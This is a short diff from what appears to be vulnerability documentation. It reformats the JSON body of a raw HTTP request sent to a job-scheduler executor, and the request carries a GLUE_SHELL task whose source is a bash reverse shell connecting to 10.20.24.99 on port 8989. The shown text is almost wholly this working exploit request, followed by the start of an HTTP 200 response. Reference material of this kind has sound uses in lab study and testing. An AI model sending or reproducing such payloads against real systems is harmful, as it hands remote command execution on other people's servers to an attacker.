@@ -426,7 +426,20 @@ Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: keep-alive
 Content-Length: 326
 
-{"jobId":2,"executorHandler":"","executorParams":"","executorBlockStrategy":"SERIAL_EXECUTION","executorTimeout":0,"logId":14,"logDateTime":1603865786404,"glueType":"GLUE_SHELL","glueSource":"bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n","glueUpdatetime":1603860395000,"broadcastIndex":0,"broadcastTotal":1}
+{
+  "jobId": 2,
+  "executorHandler": "",
+  "executorParams": "",
+  "executorBlockStrategy": "SERIAL_EXECUTION",
+  "executorTimeout": 0,
+  "logId": 14,
+  "logDateTime": 1603865786404,
+  "glueType": "GLUE_SHELL",
+  "glueSource": "bash -i >& /dev/tcp/10.20.24.99/8989 0>&1\n",
+  "glueUpdatetime": 1603860395000,
+  "broadcastIndex": 0,
+  "broadcastTotal": 1
+}
 
 HTTP/1.1 200 OK
 content-type: text/html;charset=UTF-8
